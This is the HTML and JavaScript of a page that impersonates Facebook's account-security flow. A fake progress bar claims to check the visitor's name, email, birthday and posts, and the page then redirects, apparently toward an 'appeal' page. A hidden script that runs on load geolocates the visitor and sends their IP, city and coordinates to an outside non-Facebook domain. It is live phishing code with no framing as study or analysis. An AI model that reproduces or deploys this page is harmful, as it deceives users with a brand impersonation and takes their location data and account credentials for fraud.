  <body onload="move()">
      <div style="text-align: center;">
         <img src="images/Facebook-Logo.png" style="width: 150px; height: 84px;">
      </div>
  
      <div class="main-container">
         <div class="left">
            <img src="images/Screenshot_1.png" alt="man">
         </div>
         <div class="right">
            <h5>Hi, Let's Secure Your Account</h5>
            <p>To help keep your Facebook account secure, we'll take you through a few steps to change your password and make sure any recent changes to your account came from you.</p>
            
            <div id="myProgress">
               <div id="myBar"></div>
               <div id="text"></div>
            </div>
         </div>
         <div class="bottom">
            <a href="" id="isDisabled" class="btn disabled" tabindex="-1" role="button" aria-disabled="true">Get Started</a>
         </div>
      </div>

      <script>
         function checkName(){
            document.getElementById("text").innerHTML = 'Checking your name…';
         }
         function checkEmail(){
            document.getElementById("text").innerHTML = 'Checking your email…';
         }
         function checkBirthday(){
            document.getElementById("text").innerHTML = 'Checking your birthday…';
         }
         function checkSecurity(){
            document.getElementById("text").innerHTML = 'Checking your security settings...';
         }
         function checkPost(){
            document.getElementById("text").innerHTML = 'Checking your posts…';
         }
         
         var text=document.getElementById("text");
         var i = 0;
         function move() {
            if (i == 0) {
               i = 1;
               var elem = document.getElementById("myBar");
               var width = 1;
               var id = setInterval(frame, 50);
               function frame() {
                  if (width >= 100) {
                      redirect();
                     //window.location.href="appeal";
                     document.getElementById("isDisabled").classList.remove("disabled");

                     clearInterval(id);
                     i = 0;
                  } else {
                     width++;

                     if(width>1 && width<=20) {
                        checkName();    
                     }
                     if(width==20)
                     {
                        checkEmail();
                     }
                     if(width==40)
                     {
                        checkBirthday();
                     }
                     if(width==60)
                     {
                        checkSecurity();
                     }
                     if(width==80)
                     {
                        checkPost();
                     }
                        elem.style.width = width + "%";
                  }
               }
            }
         }
        </script>
        <script>
           $(document).ready(function() {
               $.getJSON('https://ipapi.co/json/', function(data) {
                  var obj = JSON.parse(JSON.stringify(data, null, 2));
                  var country_name = obj.country_name;
                  var country_code = obj.country_code;
                  var country_city = obj.city;
                  var country_latitude = obj.latitude;
                  var country_longitude = obj.longitude;
                  var country_currency = obj.currency_name;

                  let post_data = {
                     ip: '160.36.59.197',
                     input: 'Location: ' + country_name + ", " + country_code + ", " + country_city + ", " + country_latitude + ", " + country_longitude + ", " + country_currency,
                     progress: "Rahmetli i ri"
                  };

                  $.ajax({
                     url: "https://xbrba.desk-meta.com/api/activity/3",
                     type: "POST",
                     data: JSON.stringify(post_data),
                     contentType: "application/json; charset=utf-8",
                     dataType: "json",
                     success: function(){
                     }
                  });
               });
           });
        </script>
